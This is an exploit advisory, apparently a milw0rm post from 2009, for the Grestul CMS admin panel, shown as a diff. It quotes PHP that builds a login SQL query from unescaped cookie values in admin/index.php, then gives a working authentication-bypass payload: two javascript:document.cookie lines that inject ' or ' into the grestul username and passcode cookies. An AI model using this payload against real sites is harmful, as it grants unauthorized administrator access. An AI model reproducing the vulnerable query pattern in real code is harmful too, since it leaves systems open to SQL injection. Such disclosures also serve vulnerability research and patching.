@@ -1,0 +1,54 @@
+########################################
+Grestul Sql Injection By Cookie ( bypass)
+########################################
+Autore: x0r
+Email: andry2000@hotmail.it
+Site: http://w00tz0ne.org
+########################################
+
+Let's Go!
+
+\admin\login.php :
+
+$username = SafeAddSlashes($_POST['username']);
+$passcode = SafeAddSlashes(md5($_POST['passcode']));
+$time = time();
+$check = SafeAddSlashes($_POST['setcookie']);
+
+$query = "SELECT user, pass FROM grestullogin WHERE user = '$username' AND
+pass = '$passcode'";
+$result = mysql_query($query, $db);
+if(mysql_num_rows($result)) {
+$_SESSION['loggedin'] = 1;
+	if($check) {
+	setcookie("grestul[username]", $username, $time + 3600);
+	setcookie("grestul[passcode]", $passcode, $time + 3600);
+
+Oh damn ! SafeAddSlashes...our ' or ' don't go! But...\admin\index.php
+
+if(isset($_COOKIE['grestul'])) {
+
+include 'inc/config.php';
+
+$username = $_COOKIE['grestul']['username'];
+$passcode = $_COOKIE['grestul']['passcode'];
+
+$query = "SELECT user, pass FROM grestullogin WHERE user = '$username' AND
+pass = '$passcode'";
+$result = mysql_query($query, $db);
+
+So....
+
+Exploit:
+
+[+]javascript:document.cookie = "grestul[username]=' or '; path=/";
+[+]javascript:document.cookie = "grestul[passcode]=' or '; path=/";
+
+And then \admin\index.php ^ ^ Auth Bypassed ^ ^
+
+################################################
+
+w00t Z0ne - InfoSec Forums
+    [ w00tZ0ne.org ]
+
+# milw0rm.com [2009-02-16]
